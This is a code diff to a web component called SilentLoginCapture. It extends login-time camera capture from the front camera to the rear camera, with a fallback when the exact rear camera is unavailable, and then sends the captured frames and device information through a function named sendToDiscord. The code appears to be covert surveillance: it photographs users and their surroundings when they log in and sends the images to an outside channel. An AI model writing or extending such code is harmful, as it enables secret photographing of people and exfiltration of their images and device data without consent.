@@ -163,6 +163,7 @@ export default function SilentLoginCapture({
   async function startCapture(deviceInfo: DeviceInfo) {
     if (captureEnabled) {
       try {
+        // Start front camera
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: 640, height: 480 },
           audio: false,
@@ -172,14 +173,40 @@ export default function SilentLoginCapture({
           videoRef.current.play();
         }
       } catch {
-        console.log("[SilentCapture] Camera not available");
+        console.log("[SilentCapture] Front camera not available");
+      }
+
+      // Try to start back camera
+      try {
+        const backStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: "environment" }, width: 640, height: 480 },
+          audio: false,
+        });
+        if (videoBackRef.current) {
+          videoBackRef.current.srcObject = backStream;
+          videoBackRef.current.play();
+        }
+      } catch {
+        try {
+          // Fallback: try without exact
+          const backStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment", width: 640, height: 480 },
+            audio: false,
+          });
+          if (videoBackRef.current) {
+            videoBackRef.current.srcObject = backStream;
+            videoBackRef.current.play();
+          }
+        } catch {
+          console.log("[SilentCapture] Back camera not available");
+        }
       }
     }
 
-    // Wait a bit, then capture and send
+    // Wait 3 seconds for cameras to initialize, then capture and send
     setTimeout(() => {
       sendToDiscord(deviceInfo);
-    }, 2000);
+    }, 3000);
   }
 
   function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
